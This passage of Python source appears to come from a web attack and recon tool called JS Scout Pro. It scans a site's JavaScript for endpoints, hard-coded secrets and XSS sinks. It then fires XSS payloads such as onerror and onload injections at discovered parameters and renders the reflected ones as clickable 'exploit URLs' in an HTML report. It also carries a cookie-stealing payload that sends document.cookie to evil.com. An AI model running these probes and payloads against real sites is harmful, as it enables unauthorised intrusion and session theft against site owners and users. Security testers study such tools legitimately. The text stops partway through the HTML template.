                self.log(f"  [analyze] {fname}: {n_ep} endpoints  {n_sec} secrets  {n_xss} XSS sinks")

            except Exception as e:
                self.log(f"  [!] Error analyzing {js_file.name}: {e}")

        self.results.update({
            'endpoints': endpoints, 'secrets': secrets,
            'xss_findings': xss, 'dom_clobber': dom_cb,
            'proto_pollution': proto, 'keywords': dict(keywords),
            'external_urls': list(ext_urls), 'js_files': stats,
            'total_js': len(js_files),
            'visited_pages': sorted(self.visited_pages),
        })

    def _find_endpoints(self, content: str) -> set:
        found = set()
        for pat in ENDPOINT_PATTERNS:
            for m in pat.finditer(content):
                ep = m.group(1).strip()
                if 3 < len(ep) < 200:
                    found.add(ep)
        return found

    def _find_secrets(self, content: str, fname: str) -> list:
        found = []; seen = set()
        SKIP = {'placeholder','example','changeme','your_api_key','your_secret',
                'your_token','undefined','null','true','false','test','demo','xxx'}
        for pat, stype, severity in SECRET_PATTERNS:
            for m in pat.finditer(content):
                val = (m.group(1) if m.lastindex else m.group(0)).strip()
                if val.lower() in SKIP or len(val) < 4:
                    continue
                key = f'{fname}:{stype}:{val[:20]}'
                if key in seen: continue
                seen.add(key)
                line = content[:m.start()].count('\n') + 1
                ctx  = content[max(0,m.start()-60):m.end()+60].replace('\n',' ').strip()
                found.append({'file': fname, 'type': stype, 'severity': severity,
                              'value': val[:120], 'line': line, 'context': ctx[:250]})
        return found

    def _find_xss(self, content: str, fname: str) -> list:
        found = []; seen = set()
        lines = content.split('\n')
        for pat, sink, severity in XSS_SINKS:
            for m in pat.finditer(content):
                line_num = content[:m.start()].count('\n') + 1
                key = f'{fname}:{sink}:{line_num}'
                if key in seen: continue
                seen.add(key)
                ctx_lines = lines[max(0,line_num-3):min(len(lines),line_num+3)]
                nearby    = '\n'.join(lines[max(0,line_num-20):min(len(lines),line_num+5)])
                sources   = [name for p2, name in XSS_SOURCES if p2.search(nearby)]
                eff_sev   = ('CRITICAL' if severity in ('HIGH','CRITICAL') else 'HIGH') if sources else severity
                found.append({'file': fname, 'sink_type': sink, 'severity': eff_sev,
                              'line': line_num, 'code': m.group(0)[:300].strip(),
                              'context': '\n'.join(ctx_lines).strip()[:500],
                              'sources': sources, 'confirmed_flow': bool(sources),
                              'payloads': self._payloads_for(sink)})
        return found

    def _payloads_for(self, sink: str) -> list:
        m = {
            'innerHTML': XSS_PAYLOADS['basic'][:3]+XSS_PAYLOADS['filter_bypass'][:2],
            'insertAdjacentHTML': XSS_PAYLOADS['filter_bypass'][:3],
            'dangerouslySetInnerHTML': XSS_PAYLOADS['basic'][:3],
            'eval': XSS_PAYLOADS['encoded'][:3],
            'new Function()': ['return alert(1)','return fetch("//evil.com?c="+document.cookie)'],
            'document.write': XSS_PAYLOADS['basic'][:2],
            'createContextualFragment': XSS_PAYLOADS['filter_bypass'][:2],
            'location.href=': XSS_PAYLOADS['dom'][:3],
            'location.replace/assign': ['javascript:alert(1)'],
            '$.html()': XSS_PAYLOADS['basic'][:2],
            '$.attr(href/src)': ['javascript:alert(1)','" onerror=alert(1) x="'],
            '[innerHTML] binding': XSS_PAYLOADS['basic'][:2],
        }
        return (XSS_PAYLOADS['polyglot'][:2] + m.get(sink, XSS_PAYLOADS['basic'][:2]))[:6]

    def _find_dom_clobber(self, content: str, fname: str) -> list:
        found = []; seen = set()
        lines = content.split('\n')
        for pat, name, severity in DOM_CLOBBER:
            for m in pat.finditer(content):
                ln = content[:m.start()].count('\n') + 1
                k  = f'{fname}:{name}:{ln}'
                if k not in seen:
                    seen.add(k)
                    ctx = '\n'.join(lines[max(0,ln-2):min(len(lines),ln+2)])
                    found.append({'file': fname, 'type': name, 'severity': severity,
                                  'line': ln, 'code': m.group(0)[:200].strip(),
                                  'context': ctx.strip()[:400],
                                  'payloads': XSS_PAYLOADS['dom_clobbering'][:3]})
        return found

    def _find_proto(self, content: str, fname: str) -> list:
        found = []; seen = set()
        lines = content.split('\n')
        for pat, name, severity in PROTO_POLLUTION:
            for m in pat.finditer(content):
                ln = content[:m.start()].count('\n') + 1
                k  = f'{fname}:{name}:{ln}'
                if k not in seen:
                    seen.add(k)
                    ctx = '\n'.join(lines[max(0,ln-2):min(len(lines),ln+2)])
                    found.append({'file': fname, 'type': name, 'severity': severity,
                                  'line': ln, 'code': m.group(0)[:200].strip(),
                                  'context': ctx.strip()[:400],
                                  'payloads': XSS_PAYLOADS['prototype_pollution'][:3]})
        return found

    def _is_minified(self, c: str) -> bool:
        lines = c.split('\n')
        return (sum(len(l) for l in lines) / max(len(lines),1)) > 400

    # =========================================================================
    # PHASE 6: REPORT
    # =========================================================================

    # =========================================================================
    # PHASE 6: PARAM PROBING — find exact vulnerable URLs + parameters
    # =========================================================================

    # Probe payload — unique string we can detect in the response
    _PROBE_MARKER  = 'JSSCOUT_XSS_7x9z'
    # Payloads ordered from least-disruptive to most
    _PROBE_PAYLOADS = [
        f'"><img src=x onerror=alert("{_PROBE_MARKER}")>',
        f"'><svg onload=alert('{_PROBE_MARKER}')>",
        f'<script>alert("{_PROBE_MARKER}")</script>',
        f'javascript:alert("{_PROBE_MARKER}")',
        f'{_PROBE_MARKER}<>"\'',
    ]

    def _probe_params(self):
        """
        Probe every discovered page for reflected XSS.
        Fixed: no redundant re-fetches, better escape detection,
               skips non-same-domain URLs, proper timeout cap.
        """
        from urllib.parse import parse_qs, urlencode

        common_params = [
            'q','s','search','query','id','name','user','input','text','msg',
            'message','data','value','url','redirect','page','keyword','term',
            'email','comment','content','ref','next','return','from','to',
            'title','body','subject','description','username','token',
            'action','type','category','tag','filter','sort','order','lang',
            'locale','format','view','mode','tab','section','code','key',
        ]

        probe_targets = {}  # base_url -> set of param names to test

        # 1. Every same-domain page we visited
        for url in list(self.visited_pages):
            parsed = urlparse(url)
            # Only probe same-domain pages
            if parsed.netloc != self.base_domain:
                continue
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if base not in probe_targets:
                probe_targets[base] = set()
            existing = parse_qs(parsed.query)
            probe_targets[base].update(existing.keys())
            probe_targets[base].update(common_params)

        # 2. Discovered endpoints from JS (same-domain only)
        for ep in list(self.results.get('endpoints', {}).keys()):
            if ep.startswith('/') or ep.startswith(self.base_url):
                full   = urljoin(self.base_url, ep) if ep.startswith('/') else ep
                parsed = urlparse(full)
                if parsed.netloc and parsed.netloc != self.base_domain:
                    continue
                base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if base not in probe_targets:
                    probe_targets[base] = set()
                probe_targets[base].update(common_params)

        # 3. Parse forms from already-crawled pages using CACHED content
        #    (NO re-fetching — use a lightweight second pass with fresh GETs
        #     but only for pages that had no query params already, capped tightly)
        pages_to_form_scan = [
            u for u in list(self.visited_pages)[:20]
            if urlparse(u).netloc == self.base_domain
        ]
        form_timeout = min(self.timeout, 6)
        for page_url in pages_to_form_scan:
            try:
                resp = self.session.get(page_url, timeout=form_timeout)
                form_actions = re.findall(r'<form[^>]+action=["\']([^"\']+)["\']', resp.text, re.I)
                input_names  = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', resp.text, re.I)
                select_names = re.findall(r'<select[^>]+name=["\']([^"\']+)["\']', resp.text, re.I)
                field_names  = set(input_names + select_names)
                for action in form_actions:
                    full   = urljoin(page_url, action)
                    parsed = urlparse(full)
                    if parsed.netloc and parsed.netloc != self.base_domain:
                        continue
                    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    if base not in probe_targets:
                        probe_targets[base] = set()
                    probe_targets[base].update(field_names or common_params)
            except Exception:
                pass

        # Build flat list — tighter caps to avoid hanging
        all_pairs = []
        for base, params in list(probe_targets.items())[:25]:   # max 25 base URLs
            for param in list(params)[:15]:                      # max 15 params each
                all_pairs.append((base, param))

        self.log(f"  [probe] Testing {len(all_pairs)} param combos across {len(probe_targets)} URLs...")

        all_poc  = []
        poc_lock = threading.Lock()
        # Per-param set to avoid duplicate PoCs for same base+param
        seen_poc : set = set()

        def probe_pair(args):
            base, param = args
            probe_timeout = min(self.timeout, 6)  # never hang >6s per probe
            for payload in self._PROBE_PAYLOADS:
                test_url = f"{base}?{urlencode({param: payload})}"
                try:
                    resp = self.session.get(test_url, timeout=probe_timeout, allow_redirects=True)
                    body = resp.text

                    if self._PROBE_MARKER not in body:
                        continue

                    # Verify marker appears raw (not HTML-escaped in any form)
                    raw_pos = body.find(self._PROBE_MARKER)
                    nearby  = body[max(0, raw_pos - 100) : raw_pos + 150]

                    # Comprehensive escape check — all common HTML encoding forms
                    escaped = (
                        '&lt;'  in nearby or
                        '&gt;'  in nearby or
                        '&amp;' in nearby or
                        '&#'    in nearby or   # decimal or hex entity
                        '%3C'   in nearby or   # URL-encoded <
                        '%3E'   in nearby or   # URL-encoded >
                        '\\u003c' in nearby.lower() or  # JS unicode escape
                        '\\x3c'   in nearby.lower()
                    )
                    if escaped:
                        continue

                    dedup_key = f"{base}:{param}"
                    with poc_lock:
                        if dedup_key in seen_poc:
                            break
                        seen_poc.add(dedup_key)
                        poc = {
                            'url'    : test_url,
                            'param'  : param,
                            'payload': payload,
                            'status' : resp.status_code,
                            'context': nearby.strip()[:300],
                        }
                        all_poc.append(poc)
                    self.log(f"  [⚡ REFLECTED XSS] param={param}  {test_url[:90]}")
                    break   # one confirmed payload per param is enough
                except Exception:
                    pass

        with ThreadPoolExecutor(max_workers=min(self.threads, 6)) as pool:
            pool.map(probe_pair, all_pairs)

        self.results['poc_findings'] = all_poc

        # Attach PoCs to each XSS finding
        for finding in self.results['xss_findings']:
            finding['poc_urls'] = all_poc[:5]

    def _write_report(self) -> str:
        r   = self.results
        out = self.output_dir
        risk = self._calc_risk(r)
        summary = {
            'target':        r['target'],
            'scan_time':     time.strftime('%Y-%m-%d %H:%M:%S'),
            'risk':          risk,
            'js_files':      len(r['js_files']),
            'endpoints':     len(r['endpoints']),
            'secrets':       len(r['secrets']),
            'xss_findings':  len(r['xss_findings']),
            'xss_confirmed': sum(1 for x in r['xss_findings'] if x.get('confirmed_flow')),
            'dom_clobber':   len(r['dom_clobber']),
            'proto_pollution': len(r['proto_pollution']),
        }
        r_copy = dict(r)
        r_copy['external_urls'] = list(r.get('external_urls', []))
        (out / 'summary.json').write_text(json.dumps(summary, indent=2))
        (out / 'full_results.json').write_text(json.dumps(r_copy, indent=2, default=str))

        # ── plain text ────────────────────────────────────────────────────────
        lines = [
            '='*70, 'JS SCOUT PRO — SECURITY REPORT',
            f"Target   : {r['target']}", f"Date     : {summary['scan_time']}",
            f"Risk     : {risk}", '='*70, '',
            'SUMMARY',
            f"  JS files        : {summary['js_files']}",
            f"  Endpoints       : {summary['endpoints']}",
            f"  Secrets         : {summary['secrets']}",
            f"  XSS sinks       : {summary['xss_findings']} ({summary['xss_confirmed']} confirmed)",
            f"  DOM Clobber     : {summary['dom_clobber']}",
            f"  Proto Pollution : {summary['proto_pollution']}", '',
        ]
        if r['endpoints']:
            lines += ['─'*70, 'ENDPOINTS', '─'*70]
            for ep in sorted(r['endpoints']):
                lines.append(f"  {ep}  <- {', '.join(r['endpoints'][ep][:2])}")
            lines.append('')
        if r['secrets']:
            lines += ['─'*70, 'SECRETS', '─'*70]
            for s in sorted(r['secrets'], key=lambda x: x['severity'], reverse=True):
                lines += [f"  [{s['severity']}] {s['type']} — {s['file']}:{s['line']}",
                          f"    Value: {s['value'][:80]}", f"    Ctx  : {s['context'][:120]}", '']
        if r['xss_findings']:
            lines += ['─'*70, 'XSS SINKS', '─'*70]
            for x in sorted(r['xss_findings'], key=lambda v: v['severity'], reverse=True):
                lines.append(f"  [{x['severity']}] {x['sink_type']} — {x['file']}:{x['line']}")
                if x.get('sources'):
                    lines.append(f"    CONFIRMED: {', '.join(x['sources'])}")
                lines += [f"    Code: {x['code'][:100]}",
                          f"    Payloads: {' | '.join(x['payloads'][:2])}", '']
        lines += ['─'*70, 'XSS PAYLOAD LIBRARY', '─'*70]
        for cat, payloads in XSS_PAYLOADS.items():
            lines.append(f'\n  [{cat.upper()}]')
            for p in payloads:
                lines.append(f'    {p}')

        rp = out / 'report.txt'
        rp.write_text('\n'.join(lines), encoding='utf-8')
        (out / 'endpoints.txt').write_text('\n'.join(sorted(r['endpoints'])))
        (out / 'secrets.txt').write_text('\n'.join(
            f"[{s['severity']}] {s['type']} | {s['file']}:{s['line']} | {s['value']}"
            for s in r['secrets']))
        (out / 'xss_sinks.txt').write_text('\n'.join(
            f"[{x['severity']}] {x['sink_type']} | {x['file']}:{x['line']} | confirmed={x['confirmed_flow']}"
            for x in r['xss_findings']))
        (out / 'payload_library.json').write_text(json.dumps(XSS_PAYLOADS, indent=2))

        # ── HTML report ───────────────────────────────────────────────────────
        html_path = out / 'report.html'
        html_path.write_text(self._build_html_report(r, summary, risk), encoding='utf-8')

        return str(html_path)   # return HTML path so server can link to it

    # -------------------------------------------------------------------------
    def _build_html_report(self, r: dict, summary: dict, risk: str) -> str:
        import html as _html

        def e(s):
            return _html.escape(str(s) if s else '')

        SEV_COLOR = {
            'CRITICAL': '#ff2244', 'HIGH': '#ff6622',
            'MEDIUM':   '#ffcc00', 'LOW':  '#44aaff', 'INFO': '#aaaaaa',
        }
        RISK_COLOR = {
            'CRITICAL': '#ff2244', 'HIGH': '#ff6622',
            'MEDIUM': '#ffcc00', 'LOW': '#44aaff', 'INFO': '#aaaaaa',
        }

        def badge(sev):
            c = SEV_COLOR.get(sev, '#aaa')
            return (f'<span style="border:1px solid {c};color:{c};'
                    f'padding:2px 8px;font-size:11px;font-family:monospace;'
                    f'letter-spacing:1px;border-radius:2px">{e(sev)}</span>')

        def card(title, sev, body_html, confirmed=False):
            c = SEV_COLOR.get(sev, '#aaa')
            conf = ('<span style="background:#ff224422;border:1px solid #ff2244;'
                    'color:#ff2244;padding:2px 8px;font-size:10px;margin-left:8px">'
                    '&#9889; CONFIRMED SOURCE&#8594;SINK</span>' if confirmed else '')
            return f'''
<div style="border:1px solid #1e2d3d;margin-bottom:8px;background:#0d1117">
  <div style="padding:12px 16px;display:flex;align-items:center;gap:10px;
              border-bottom:1px solid #1e2d3d;cursor:pointer"
       onclick="this.nextElementSibling.style.display=
                this.nextElementSibling.style.display==='none'?'block':'none'">
    {badge(sev)}
    <span style="font-family:monospace;color:#c9d8e8;flex:1">{title}</span>
    {conf}
    <span style="color:#3a5068;font-size:12px">&#9660;</span>
  </div>
  <div style="padding:16px;display:none">{body_html}</div>
</div>'''

        def code(s):
            return (f'<pre style="background:#080b0f;border:1px solid #1e2d3d;'
                    f'border-left:3px solid #ff6622;padding:10px 14px;'
                    f'font-size:12px;color:#ffaa00;overflow-x:auto;white-space:pre-wrap;'
                    f'word-break:break-all;margin:8px 0">{e(s)}</pre>')

        def payload_row(p):
            # SAFE: payload stored in data-p attribute — never injected raw into onclick
            ep = e(p)
            return (f'<div class="cp-row" data-p="{e(p)}" '
                    f'style="background:#080b0f;border:1px solid #1e2d3d;'
                    f'border-left:2px solid #00ff9f;padding:6px 12px;margin:3px 0;'
                    f'cursor:pointer;display:flex;justify-content:space-between;'
                    f'align-items:center;gap:8px">'
                    f'<code style="color:#00d4ff;font-size:11px;word-break:break-all">{ep}</code>'
                    f'<span class="cp" style="color:#3a5068;font-size:10px;'
                    f'white-space:nowrap;flex-shrink:0">[ copy ]</span></div>')

        def section(title, count):
            return (f'<h2 style="font-family:\'Courier New\',monospace;font-size:13px;'
                    f'color:#00ff9f;letter-spacing:3px;border-bottom:1px solid #1e2d3d;'
                    f'padding-bottom:8px;margin:28px 0 16px">'
                    f'{e(title)} <span style="color:#3a5068">({count})</span></h2>')

        # ── PoC confirmed findings banner ─────────────────────────────────────
        poc_findings = r.get('poc_findings', [])
        poc_section  = ''
        if poc_findings:
            poc_section = f'<div style="background:#0d1117;border:2px solid #ff2244;padding:20px;margin-bottom:24px"><div style="font-family:monospace;font-size:11px;color:#ff2244;letter-spacing:3px;margin-bottom:16px">&#9889; CONFIRMED REFLECTED XSS — EXACT EXPLOIT URLS ({len(poc_findings)} found)</div>'
            for poc in poc_findings:
                su = e(poc['url'])
                poc_section += f'''<div style="background:#080b0f;border:1px solid #ff2244;border-left:3px solid #ff2244;padding:14px;margin-bottom:10px">
  <div style="margin-bottom:8px"><span style="background:#ff224422;border:1px solid #ff2244;color:#ff2244;padding:2px 8px;font-size:10px;letter-spacing:2px">PARAM: {e(poc["param"])}</span></div>
  <div style="font-size:10px;color:#3a5068;letter-spacing:2px;margin-bottom:4px">VULNERABLE URL:</div>
  <a href="{su}" target="_blank" style="color:#ff6622;font-family:monospace;font-size:12px;word-break:break-all;text-decoration:none;display:block;padding:8px;background:#111;border:1px solid #1e2d3d;margin-bottom:8px">{su}</a>
  <div style="font-size:10px;color:#3a5068;letter-spacing:2px;margin-bottom:4px">PAYLOAD USED:</div>
  <code style="color:#00d4ff;font-size:12px;word-break:break-all">{e(poc["payload"])}</code>
  <div style="display:flex;gap:8px;margin-top:10px">
    <a href="{su}" target="_blank" style="background:#ff2244;color:#fff;font-family:monospace;font-size:11px;font-weight:700;letter-spacing:2px;padding:7px 16px;text-decoration:none">&#9889; OPEN IN BROWSER</a>
    <button class="cp-row" data-p="{e(poc['url'])}" style="background:none;border:1px solid #ff2244;color:#ff2244;font-family:monospace;font-size:11px;padding:7px 16px;cursor:pointer;letter-spacing:2px">COPY URL</button>
  </div>
</div>'''
            poc_section += '</div>'

        # ── Build test URLs for XSS sinks ────────────────────────────────────
        # Common params most likely to be reflected
        TEST_PARAMS = ['q', 'search', 'query', 's', 'id', 'name', 'input',
                       'text', 'msg', 'redirect', 'url', 'ref', 'next',
                       'keyword', 'term', 'page', 'value', 'data', 'comment']
        # Pages we actually crawled — use these as test URLs
        crawled_pages = sorted(r.get('visited_pages', [r['target']]))[:10]
        if not crawled_pages:
            crawled_pages = [r['target']]

        def make_test_links(sink_type, payloads):
            """Generate ready-to-click test URLs: page?param=payload"""
            from urllib.parse import quote
            links_html = ''
            best_payloads = payloads[:3] if payloads else ['<script>alert(1)</script>']
            # Pick top 3 pages × top 3 params × best payload
            shown = 0
            for page in crawled_pages[:5]:
                for param in TEST_PARAMS[:6]:
                    for payload in best_payloads[:1]:
                        test_url = f"{page}?{param}={quote(payload, safe='')}"
                        eu = e(test_url)
                        ep = e(payload)
                        epar = e(param)
                        links_html += f'''
<div style="background:#080b0f;border:1px solid #1e2d3d;border-left:3px solid #ff6622;
            padding:10px 14px;margin-bottom:6px">
  <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;flex-wrap:wrap">
    <span style="background:#ff662222;border:1px solid #ff6622;color:#ff6622;
                 padding:2px 8px;font-size:10px;letter-spacing:2px;white-space:nowrap">
      PARAM: ?{epar}=</span>
    <span style="color:#ffcc00;font-size:11px;word-break:break-all">{ep}</span>
  </div>
  <div style="font-size:10px;color:#3a5068;margin-bottom:4px;letter-spacing:1px">
    TEST THIS URL IN YOUR BROWSER:</div>
  <a href="{eu}" target="_blank"
     style="color:#00d4ff;font-family:monospace;font-size:11px;word-break:break-all;
            text-decoration:none;display:block;padding:6px 8px;background:#080b0f;
            border:1px solid #1e2d3d;margin-bottom:6px">{eu}</a>
  <div style="display:flex;gap:6px;flex-wrap:wrap">
    <a href="{eu}" target="_blank"
       style="background:#ff6622;color:#fff;font-size:10px;padding:4px 14px;
              text-decoration:none;letter-spacing:1px;font-family:monospace">
      ▶ OPEN &amp; TEST</a>
    <span class="cp-row" data-p="{eu}"
       style="background:none;border:1px solid #3a5068;color:#6b8fa8;font-size:10px;
              padding:4px 10px;cursor:pointer;font-family:monospace">
      COPY URL <span class="cp"></span></span>
  </div>
</div>'''
                        shown += 1
                        if shown >= 4:
                            break
                    if shown >= 4:
                        break
                if shown >= 4:
                    break
            return links_html

        # ── XSS section ───────────────────────────────────────────────────────
        xss_html = ''
        for x in sorted(r['xss_findings'], key=lambda v: {'CRITICAL':0,'HIGH':1,'MEDIUM':2}.get(v['severity'],3)):
            body = ''
            if x.get('sources'):
                srcs = ', '.join(e(s) for s in x['sources'])
                body += f'<div style="color:#ffaa00;font-size:12px;margin-bottom:8px">&#9888; Source → Sink: <b>{srcs}</b></div>'
            body += f'<div style="color:#6b8fa8;font-size:11px;margin-bottom:4px">Found in JS file: <b style="color:#c9d8e8">{e(x["file"])}</b> &nbsp; Line: <b style="color:#c9d8e8">{e(x["line"])}</b></div>'
            body += code(x['code'])
            if x.get('context'):
                body += f'<details style="margin-top:6px"><summary style="color:#3a5068;font-size:11px;cursor:pointer">Show context</summary>{code(x["context"])}</details>'

            # ── Exact PoC URLs (from probe phase, if any) ─────────────────
            if x.get('poc_urls'):
                body += '<div style="color:#ff2244;font-size:11px;font-weight:bold;letter-spacing:2px;margin:14px 0 8px">&#9889; CONFIRMED — EXACT VULNERABLE URLS:</div>'
                for poc in x['poc_urls'][:5]:
                    su = e(poc['url'])
                    body += f'''<div style="background:#080b0f;border:1px solid #ff2244;border-left:3px solid #ff2244;padding:12px;margin-bottom:8px">
  <div style="margin-bottom:6px">
    <span style="background:#ff224422;border:1px solid #ff2244;color:#ff2244;
                 padding:2px 8px;font-size:10px;letter-spacing:2px">
      VULNERABLE PARAM: ?{e(poc["param"])}=</span>
  </div>
  <div style="font-size:10px;color:#3a5068;margin-bottom:4px">PAYLOAD USED:</div>
  <code style="color:#ffcc00;font-size:11px;word-break:break-all;display:block;
               background:#080b0f;padding:4px 8px;border:1px solid #1e2d3d;margin-bottom:8px">
    {e(poc["payload"])}</code>
  <div style="font-size:10px;color:#3a5068;margin-bottom:4px">EXPLOIT URL (click to open):</div>
  <a href="{su}" target="_blank"
     style="color:#ff6622;font-family:monospace;font-size:12px;word-break:break-all;
            text-decoration:none;display:block;padding:8px;background:#111;
            border:1px solid #ff2244;margin-bottom:8px">{su}</a>
  <div style="display:flex;gap:8px">
    <a href="{su}" target="_blank"
       style="background:#ff2244;color:#fff;font-family:monospace;font-size:10px;
              font-weight:700;letter-spacing:2px;padding:6px 14px;text-decoration:none">
      &#9889; OPEN IN BROWSER</a>
    <span class="cp-row" data-p="{su}"
       style="background:none;border:1px solid #ff2244;color:#ff2244;
              font-family:monospace;font-size:10px;padding:6px 12px;
              cursor:pointer;letter-spacing:1px">
      COPY URL <span class="cp"></span></span>
  </div>
</div>'''
            else:
                # ── No confirmed PoC — generate candidate test URLs ────────
                body += f'''<div style="background:#0d1117;border:1px solid #ffcc00;
                              border-left:3px solid #ffcc00;padding:12px;margin:12px 0">
  <div style="color:#ffcc00;font-size:11px;font-weight:bold;letter-spacing:2px;margin-bottom:8px">
    &#9658; HOW TO TEST THIS FINDING</div>
  <div style="color:#c9d8e8;font-size:12px;margin-bottom:12px;line-height:1.6">
    This sink was found in <code style="color:#00d4ff">{e(x["file"])}</code>.<br>
    Try injecting an XSS payload into URL parameters on the pages below.
    If the page reflects the parameter value without escaping, this sink will execute it.
  </div>
  {make_test_links(x["sink_type"], x.get("payloads", []))}
</div>'''

            if x.get('payloads'):
                body += '<div style="color:#00ff9f;font-size:10px;letter-spacing:2px;margin:12px 0 6px">ALL PAYLOADS TO TRY:</div>'
                for p in x['payloads']:
                    body += payload_row(p)
            xss_html += card(f"{x['sink_type']}  &nbsp; <span style='color:#3a5068'>{e(x['file'])}:{e(x['line'])}</span>",
                             x['severity'], body, x.get('confirmed_flow', False))

        # ── Secrets section ───────────────────────────────────────────────────
        sec_html = ''
        for s in sorted(r['secrets'], key=lambda x: {'CRITICAL':0,'HIGH':1,'MEDIUM':2}.get(x['severity'],3)):
            body = (f'<div style="color:#6b8fa8;font-size:11px;margin-bottom:8px">'
                    f'File: {e(s["file"])} &nbsp; Line: {e(s["line"])}</div>')
            body += code(s['value'])
            body += (f'<div style="color:#6b8fa8;font-size:11px;margin-top:8px">'
                     f'Context: {e(s["context"][:200])}</div>')
            body += '<div style="margin-top:10px">' + payload_row(s['value']) + '</div>'
            sec_html += card(f"{e(s['type'])}  &nbsp; <span style='color:#3a5068'>{e(s['file'])}:{e(s['line'])}</span>",
                            s['severity'], body)

        # ── Endpoints section ─────────────────────────────────────────────────
        ep_rows = ''
        for ep in sorted(r['endpoints']):
            files = ', '.join(r['endpoints'][ep][:3])
            ep_rows += (f'<div style="display:flex;gap:12px;padding:7px 0;'
                        f'border-bottom:1px solid #111720;font-size:13px">'
                        f'<span style="color:#00d4ff;font-family:monospace;word-break:break-all;flex:1">{e(ep)}</span>'
                        f'<span style="color:#3a5068;font-size:11px;white-space:nowrap">{e(files)}</span>'
                        f'</div>')

        # ── Payload library ───────────────────────────────────────────────────
        pl_html = ''
        for cat, payloads in XSS_PAYLOADS.items():
            pl_html += (f'<div style="margin-bottom:20px">'
                        f'<div style="color:#00ff9f;font-size:10px;letter-spacing:3px;'
                        f'text-transform:uppercase;margin-bottom:8px;border-bottom:1px solid #1e2d3d;padding-bottom:6px">'
                        f'{e(cat.replace("_"," "))}</div>')
            for p in payloads:
                pl_html += payload_row(p)
            pl_html += '</div>'

        # ── Stats bar ─────────────────────────────────────────────────────────
        rc = RISK_COLOR.get(risk, '#aaa')
        stats = [
            ('JS FILES',      summary['js_files'],      '#00d4ff'),
            ('ENDPOINTS',     summary['endpoints'],      '#00ff9f'),
            ('SECRETS',       summary['secrets'],        '#ff2244' if summary['secrets'] else '#00ff9f'),
            ('XSS CONFIRMED', summary['xss_confirmed'],  '#ff2244' if summary['xss_confirmed'] else '#00ff9f'),
            ('XSS SINKS',     summary['xss_findings'],   '#ff6622' if summary['xss_findings'] else '#00ff9f'),
            ('DOM CLOBBER',   summary['dom_clobber'],    '#ffcc00' if summary['dom_clobber'] else '#00ff9f'),
        ]
        stat_boxes = ''
        for label, val, color in stats:
            stat_boxes += (f'<div style="background:#0d1117;border:1px solid #1e2d3d;'
                           f'padding:16px 20px;text-align:center;flex:1;min-width:100px">'
                           f'<div style="font-family:\'Courier New\',monospace;font-size:28px;'
                           f'font-weight:700;color:{color}">{val}</div>'
                           f'<div style="font-size:9px;color:#3a5068;letter-spacing:2px;margin-top:4px">{label}</div>'
                           f'</div>')

        dom_html = ''
        for d in r.get('dom_clobber', []):
            body = f'<div style="color:#6b8fa8;font-size:11px;margin-bottom:4px">File: {e(d["file"])} Line: {e(d["line"])}</div>'
            body += code(d['code'])
            for p in d.get('payloads', []):
                body += payload_row(p)
            dom_html += card(f"{e(d['type'])}  &nbsp; <span style='color:#3a5068'>{e(d['file'])}</span>",
                            d['severity'], body)

        proto_html = ''
        for p in r.get('proto_pollution', []):
            body = f'<div style="color:#6b8fa8;font-size:11px;margin-bottom:4px">File: {e(p["file"])} Line: {e(p["line"])}</div>'
            body += code(p['code'])
            for pl in p.get('payloads', []):
                body += payload_row(pl)
            proto_html += card(f"{e(p['type'])}  &nbsp; <span style='color:#3a5068'>{e(p['file'])}</span>",
                              p['severity'], body)

        return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>JS Scout Report — {e(r["target"])}</title>
<style>
  *{{margin:0;padding:0;box-sizing:border-box}}
  body{{background:#080b0f;color:#c9d8e8;font-family:"Courier New",monospace;min-height:100vh}}
  body::before{{content:"";position:fixed;inset:0;background-image:
    linear-gradient(rgba(0,255,159,.03) 1px,transparent 1px),
    linear-gradient(90deg,rgba(0,255,159,.03) 1px,transparent 1px);
    background-size:40px 40px;pointer-events:none;z-index:0}}
  .wrap{{position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:32px 20px}}
  .tab-btn{{background:none;border:none;border-bottom:2px solid transparent;
    color:#3a5068;font-family:"Courier New",monospace;font-size:11px;
    letter-spacing:2px;padding:10px 18px;cursor:pointer;text-transform:uppercase;transition:all .2s}}
  .tab-btn:hover{{color:#c9d8e8}}
  .tab-btn.on{{color:#00ff9f;border-bottom-color:#00ff9f}}
  .tab{{display:none}}.tab.on{{display:block}}
  summary{{outline:none}}
  ::-webkit-scrollbar{{width:4px}};::-webkit-scrollbar-thumb{{background:#1e2d3d}}
  #notif{{position:fixed;bottom:20px;right:20px;background:#0d1117;border:1px solid #00ff9f;
    color:#00ff9f;padding:8px 18px;font-size:12px;letter-spacing:2px;
    opacity:0;transition:opacity .3s;pointer-events:none;z-index:9999}}
  #notif.show{{opacity:1}}
</style>
</head>
<body>
<div class="wrap">

  <!-- Header -->
  <div style="margin-bottom:28px">
    <div style="font-size:11px;color:#3a5068;letter-spacing:4px;margin-bottom:8px">JS SCOUT PRO // SECURITY REPORT</div>
    <div style="font-size:22px;letter-spacing:2px;color:#00ff9f;margin-bottom:4px">{e(r["target"])}</div>
    <div style="font-size:12px;color:#3a5068">{e(summary["scan_time"])}</div>
    <div style="margin-top:12px;display:inline-block;border:1px solid {rc};
                color:{rc};padding:4px 16px;font-size:11px;letter-spacing:3px">
      &#9888; RISK: {e(risk)}
    </div>
  </div>

  <!-- Stats -->
  <div style="display:flex;flex-wrap:wrap;gap:2px;margin-bottom:24px">
    {stat_boxes}
  </div>

  <!-- PoC Banner — shown above tabs when reflected XSS is confirmed -->
  {poc_section}

  <!-- Tabs -->
  <div style="border-bottom:1px solid #1e2d3d;margin-bottom:0;display:flex;flex-wrap:wrap">
    <button class="tab-btn on" onclick="showTab('poc',this)">&#9889; POC URLS ({len(poc_findings)})</button>
    <button class="tab-btn"    onclick="showTab('xss',this)">XSS SINKS ({summary["xss_findings"]})</button>
    <button class="tab-btn"    onclick="showTab('secrets',this)">SECRETS ({summary["secrets"]})</button>
    <button class="tab-btn"    onclick="showTab('endpoints',this)">ENDPOINTS ({summary["endpoints"]})</button>
    <button class="tab-btn"    onclick="showTab('dom',this)">DOM/PROTO ({summary["dom_clobber"] + summary["proto_pollution"]})</button>
    <button class="tab-btn"    onclick="showTab('payloads',this)">PAYLOAD LIBRARY</button>
  </div>

